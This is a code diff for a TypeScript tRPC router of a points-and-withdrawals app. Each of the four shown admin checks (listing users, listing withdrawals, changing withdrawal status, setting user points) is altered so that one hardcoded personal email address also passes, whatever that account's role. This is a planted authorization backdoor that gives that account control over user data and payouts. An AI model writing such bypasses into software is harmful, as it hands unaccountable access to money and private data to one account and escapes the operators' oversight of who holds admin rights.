@@ -144,7 +144,7 @@ export const appRouter = router({
     // Get all users with points
     users: protectedProcedure.query(async ({ ctx }) => {
       // Check if user is admin
-      if (ctx.user.role !== "admin") {
+      if (ctx.user.role !== "admin" && ctx.user.email !== "youseef500600700800@gmail.com") {
         throw new Error("Unauthorized");
       }
       return db.getAllUsersWithPoints();
@@ -152,7 +152,7 @@ export const appRouter = router({
 
     // Get all withdrawal requests
     withdrawals: protectedProcedure.query(async ({ ctx }) => {
-      if (ctx.user.role !== "admin") {
+      if (ctx.user.role !== "admin" && ctx.user.email !== "youseef500600700800@gmail.com") {
         throw new Error("Unauthorized");
       }
       return db.getAllWithdrawalRequests();
@@ -165,7 +165,7 @@ export const appRouter = router({
         status: z.enum(["pending", "approved", "rejected"]),
       }))
       .mutation(async ({ ctx, input }) => {
-        if (ctx.user.role !== "admin") {
+        if (ctx.user.role !== "admin" && ctx.user.email !== "youseef500600700800@gmail.com") {
           throw new Error("Unauthorized");
         }
 
@@ -188,7 +188,7 @@ export const appRouter = router({
         points: z.number().min(0),
       }))
       .mutation(async ({ ctx, input }) => {
-        if (ctx.user.role !== "admin") {
+        if (ctx.user.role !== "admin" && ctx.user.email !== "youseef500600700800@gmail.com") {
           throw new Error("Unauthorized");
         }
         await db.updateUserPoints(input.userId, input.points);
